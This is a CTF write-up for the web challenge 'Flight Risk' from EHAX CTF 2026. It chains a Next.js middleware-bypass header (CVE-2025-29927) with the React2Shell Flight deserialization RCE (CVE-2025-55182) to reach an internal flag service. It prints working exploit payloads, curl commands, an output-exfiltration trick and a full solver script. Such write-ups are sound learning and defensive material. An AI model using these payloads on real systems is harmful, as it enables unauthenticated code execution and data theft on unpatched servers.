---
title: "[Web] Flight Risk"
description: Writeup for "Flight Risk" from EHAX CTF 2026.
date: 2026-03-01 09:00:00 +0900
categories: [CTF, EHAX CTF 2026]
tags: [Web]
toc: true
comments: false
---

# Flight Risk (EHAX CTF 2026)

---

- **Name:** Flight Risk
- **Category:** Web
- **Difficulty:** ★★★☆☆

---

## TL;DR

This challenge chains **two critical CVEs** against a Next.js 15 application:

1. **CVE-2025-29927** — Bypass the middleware WAF by spoofing an internal header
2. **CVE-2025-55182** (React2Shell) — Achieve RCE through the RSC Flight protocol deserialization bug

With RCE on the server, we discover an internal service at `internal-vault:9009` and fetch the flag from it.

**Flag:** `EHAX{1_m0r3_r34s0n_t0_us3_4ngu14r}`

---

## Overview

The target is a simple Next.js 15 web app with a text input form called `System.Greet()`. You type a name, it greets you back. That's it — on the surface.

Behind the scenes, the app has three layers:

```
Internet
   │
   ▼
┌──────────┐    ┌──────────────┐    ┌────────────────┐
│  nginx   │───▶│  Next.js 15  │───▶│ internal-vault │
│ (proxy)  │    │ (middleware   │    │   :9009        │
│          │    │  acts as WAF) │    │ (flag.txt)     │
└──────────┘    └──────────────┘    └────────────────┘
```

- **nginx** forwards traffic to Next.js
- **Next.js middleware** inspects every request and blocks malicious payloads (WAF)
- **internal-vault** is a hidden service on port 9009 that holds the flag

Our goal: bypass the WAF, get code execution, and reach the internal service.

---

## Solution

### 1) Recon

#### What we see

Visiting `http://chall.ehax.in:4269/` shows a dark-themed terminal UI with a form. The response headers tell us:

```
Server: nginx/1.29.5
X-Powered-By: Next.js
```

#### Finding the Server Action

Next.js bundles client-side JavaScript. We can read it to understand the app logic:

```
GET /_next/static/chunks/app/page-428009e448e772a0.js
```

Inside, we find:

```javascript
createServerReference(
  "7fc5b26191e27c53f8a74e83e3ab54f48edd0dbd",
  callServer, void 0, findSourceMapURL,
  "greetUser"
);
```

This is a **Server Action** — a function that runs on the server when you submit the form. The long hex string is its unique ID.

#### The hint in the name

The challenge is called **"FLIGHT RISK"**.

In React, **Flight** is the name of the protocol used by React Server Components (RSC) to send data between client and server. This is a big hint pointing us toward a Flight protocol vulnerability.

#### Looking for hidden routes

The build manifest reveals a **Bloom filter** with 3 static routes, but only `/` is accessible. Requesting `/vault` returns 404. However, the challenge description says *"the vault is still open"* — so the vault must exist somewhere internally.

---

### 2) Root Cause

This challenge exploits two vulnerabilities together.

#### Vulnerability #1 — CVE-2025-29927 (Middleware Bypass)

Next.js uses a special header called `x-middleware-subrequest` internally. This header tells the framework: *"This request already went through middleware, don't run it again."* It exists to prevent infinite loops.

The bug: **anyone can send this header from the outside**. If you include it in your request, Next.js skips all middleware — including any security checks.

For Next.js 15, the magic value is:

```
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

In this challenge, the middleware acts as a **WAF** (Web Application Firewall). It inspects request bodies for suspicious patterns and blocks them. By adding this header, we bypass the WAF completely.

**Proof:**

```bash
# Without bypass → blocked
curl -X POST http://chall.ehax.in:4269/ \
  -H "Next-Action: x" \
  -F '0={"then":"$1:__proto__:then"}'
# → {"error":"WAF Alert: Malicious payload detected."}

# With bypass → goes through
curl -X POST http://chall.ehax.in:4269/ \
  -H "Next-Action: x" \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  -F '0={"then":"$1:__proto__:then"}'
# → Server processes the request
```

#### Vulnerability #2 — CVE-2025-55182 (React2Shell)

This is a **CVSS 10.0** vulnerability disclosed in December 2025. It allows unauthenticated Remote Code Execution (RCE) on any server running React Server Components.

**How it works, simply explained:**

React Server Components use the "Flight" protocol to exchange data. When the server receives data from the client, it **deserializes** it — turning text back into JavaScript objects.

The problem: the deserializer doesn't check if the data is safe. An attacker can craft a payload that:

1. Walks up the JavaScript **prototype chain** (`__proto__`)
2. Reaches the **Function constructor** (`constructor.constructor`)
3. Passes arbitrary code to it
4. The server **executes that code**

Think of it like this: you're allowed to send a package to a factory. The factory opens every package and runs whatever instructions are inside — without checking if the instructions are dangerous.

**Key detail:** The RCE happens **during deserialization**, before the server even validates the action ID. So you can use any `Next-Action` header value — even `Next-Action: x`.

---

### 3) Exploit

#### Step 1 — Craft the RCE payload

The payload is a JSON object that abuses the Flight protocol's reference system:

```json
{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "<CODE_TO_EXECUTE>",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
```

What each field does:

| Field | Purpose |
|-------|---------|
| `then: "$1:__proto__:then"` | Traverses prototype chain to reach `Chunk.prototype.then` |
| `status: "resolved_model"` | Makes the deserializer treat this as a resolved chunk |
| `value: '{"then":"$B1337"}'` | Triggers a Blob reference, which calls `_formData.get()` |
| `_formData.get: "$1:constructor:constructor"` | Points to the JavaScript `Function` constructor |
| `_prefix` | The code passed to `Function()` — this is what gets executed |

#### Step 2 — Exfiltrate output

In production, Next.js strips error details. We can't just `throw new Error(output)` and read it.

**The trick:** Next.js has special handling for redirect errors. If we throw an error with a `NEXT_REDIRECT` digest, it returns a **303 redirect** and puts our URL in the `x-action-redirect` header.

```javascript
var result = process.mainModule
  .require('child_process')
  .execSync('COMMAND')
  .toString();

throw Object.assign(
  new Error('NEXT_REDIRECT'),
  { digest: 'NEXT_REDIRECT;push;/' + encodeURIComponent(result) + ';307;' }
);
```

The command output appears URL-encoded in the response header. Clean and reliable.

#### Step 3 — Avoid shell issues

The payload contains `$` characters (like `$1`, `$B1337`, `$Q2`). Bash interprets `$` as variable expansion, which corrupts the payload. Solution: **write the payload to a file** using a quoted heredoc:

```bash
cat > /tmp/payload0.txt << 'EOF'
{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var r=process.mainModule.require('child_process').execSync('ls /').toString();throw Object.assign(new Error('NEXT_REDIRECT'),{digest:'NEXT_REDIRECT;push;/'+encodeURIComponent(r)+';307;'});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
EOF

echo -n '"$@0"' > /tmp/payload1.txt
echo -n '[]' > /tmp/payload2.txt
```

Then send it with curl's file input syntax (`-F "0=</tmp/file"`):

```bash
curl -s -v -X POST "http://chall.ehax.in:4269/?r=$(date +%s%N)" \
  -H "Next-Action: x" \
  -H "Accept: text/x-component" \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  -F "0=</tmp/payload0.txt" \
  -F "1=</tmp/payload1.txt" \
  -F "2=</tmp/payload2.txt"
```

> **Note:** The `?r=$(date +%s%N)` query parameter is for **cache busting**. Next.js caches server action responses, so each request needs a unique URL to ensure the code actually runs.

#### Step 4 — Explore the server

Running `ls /` through RCE, the response header shows:

```
x-action-redirect: /app%0Abin%0Adev%0Aetc%0A...
```

URL-decoded: `app, bin, dev, etc, home, lib, ...`

Listing `/app/` reveals:

```
.next/
node_modules/
package.json
server.js
vault.hint       ← interesting!
```

Reading `vault.hint`:

```
internal-vault:9009
```

#### Step 5 — Access the internal service

Curling the internal service from the server:

```bash
# Command: curl -s http://internal-vault:9009/
```

Returns a directory listing with `flag.txt`.

#### Step 6 — Get the flag

```bash
# Command: curl -s http://internal-vault:9009/flag.txt
```

The final payload:

```bash
cat > /tmp/getflag.txt << 'EOF'
{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var r=process.mainModule.require('child_process').execSync('curl -s http://internal-vault:9009/flag.txt').toString();throw Object.assign(new Error('NEXT_REDIRECT'),{digest:'NEXT_REDIRECT;push;/'+encodeURIComponent(r)+';307;'});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
EOF

curl -s -v -X POST "http://chall.ehax.in:4269/?r=$(date +%s%N)" \
  -H "Next-Action: x" \
  -H "Accept: text/x-component" \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  -F "0=</tmp/getflag.txt" \
  -F "1=</tmp/payload1.txt" \
  -F "2=</tmp/payload2.txt"
```

Response:

```
HTTP/1.1 303 See Other
x-action-redirect: /EHAX{1_m0r3_r34s0n_t0_us3_4ngu14r}
```

**Flag: `EHAX{1_m0r3_r34s0n_t0_us3_4ngu14r}`**

> "1 more reason to use Angular" — a funny jab at React/Next.js security 😄

---

### 4) Why It Works

Let's walk through the full chain and why each step is necessary.

#### Why do we need the middleware bypass?

The Next.js middleware inspects every incoming request body. If it detects suspicious patterns like `__proto__` or `constructor`, it blocks the request with a WAF alert. The React2Shell payload is full of these patterns, so it **cannot reach the server** without bypassing the middleware first.

#### Why does the React2Shell payload work?

The Flight protocol deserializer uses a reference system where `$1:property` means "look up property on chunk #1." The deserializer doesn't check whether the property is a **real export** or a **prototype chain property**. So `$1:__proto__:then` walks from the chunk object up to `Object.prototype`, giving the attacker access to `constructor` — which is the `Function` constructor. Any string passed to `Function()` becomes executable JavaScript.

#### Why do we need NEXT_REDIRECT for exfiltration?

In production mode, Next.js hashes all error messages for security. A normal `throw new Error(data)` becomes `E{"digest":"1158153724"}` — a useless hash. But Next.js has special handling for redirect errors: it reads the `digest` field, parses out the URL, and sets it as the `x-action-redirect` header. This header is **not hashed**, so we can read our command output from it.

#### Why does the flag require internal SSRF?

The flag is not on the Next.js server itself. It's on a separate internal service (`internal-vault:9009`) that is **not exposed to the internet**. Only the Next.js server can reach it over the internal Docker network. So we need RCE on the Next.js server to make a request to the internal service — effectively turning our RCE into SSRF.

#### Full attack flow

```
Attacker
   │
   │ POST / with:
   │   • x-middleware-subrequest (bypass WAF)
   │   • React2Shell payload (Flight deserialization RCE)
   │   • Command: curl http://internal-vault:9009/flag.txt
   │
   ▼
┌──────────┐  header bypasses  ┌──────────────┐  curl from   ┌────────────────┐
│  nginx   │ ───────────────▶  │  Next.js 15  │ ──────────▶  │ internal-vault │
│          │                   │  (WAF skip)  │              │   :9009        │
│          │  ◀─── 303 ─────── │  (RCE runs)  │ ◀── flag ─── │  flag.txt      │
└──────────┘  x-action-redirect└──────────────┘              └────────────────┘
   │          contains flag
   ▼
Attacker reads flag from response header
```

---

## Solver

A complete one-shot solver script:

```bash
#!/bin/bash
TARGET="http://chall.ehax.in:4269"

# Payload files (using quoted heredoc to prevent $ expansion)
cat > /tmp/p0.txt << 'EOF'
{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var r=process.mainModule.require('child_process').execSync('curl -s http://internal-vault:9009/flag.txt').toString();throw Object.assign(new Error('NEXT_REDIRECT'),{digest:'NEXT_REDIRECT;push;/'+encodeURIComponent(r)+';307;'});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
EOF
echo -n '"$@0"' > /tmp/p1.txt
echo -n '[]' > /tmp/p2.txt

# Send exploit: middleware bypass + React2Shell RCE
FLAG=$(curl -s -D- -X POST "${TARGET}/?r=${RANDOM}" \
  -H "Next-Action: x" \
  -H "Accept: text/x-component" \
  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  -F "0=</tmp/p0.txt" \
  -F "1=</tmp/p1.txt" \
  -F "2=</tmp/p2.txt" 2>/dev/null \
  | grep -oP 'x-action-redirect: /\K[^;]+')

echo "Flag: $(python3 -c "import urllib.parse; print(urllib.parse.unquote('$FLAG'))")"
```

Output:

```
Flag: EHAX{1_m0r3_r34s0n_t0_us3_4ngu14r}
```

---
<img width="1228" height="335" alt="스크린샷 2026-03-01 125232" src="https://github.com/user-attachments/assets/9188bbd9-a7e6-4b71-9676-8dfc9116e211" />
---

## References

- [CVE-2025-29927 — Next.js Middleware Bypass](https://github.com/advisories/GHSA-f82v-jwr5-mffw)
- [CVE-2025-55182 — React2Shell RCE (OffSec)](https://www.offsec.com/blog/cve-2025-55182/)
- [React2Shell Deep Dive (Wiz Research)](https://www.wiz.io/blog/nextjs-cve-2025-55182-react2shell-deep-dive)
- [React Security Advisory](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components)
